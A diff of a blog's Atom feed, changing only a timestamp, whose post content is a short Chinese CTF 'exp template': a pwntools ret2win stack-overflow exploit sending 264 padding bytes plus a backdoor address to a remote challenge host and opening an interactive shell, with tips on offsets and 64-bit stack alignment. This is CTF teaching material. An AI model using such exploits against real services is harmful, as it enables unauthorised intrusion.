@@ -65,7 +65,7 @@
     <link href="https://jiutian521.github.io/posts/d4f00467.html"/>
     <id>https://jiutian521.github.io/posts/d4f00467.html</id>
     <published>2025-10-24T04:00:00.000Z</published>
-    <updated>2025-11-05T13:13:17.353Z</updated>
+    <updated>2025-11-05T13:15:13.433Z</updated>
     
     <content type="html"><![CDATA[<p>exp模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;39.106.48.123&quot;, 29826)</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*264 + p64(0x401202)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址</p><p>注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位</p>]]></content>
     
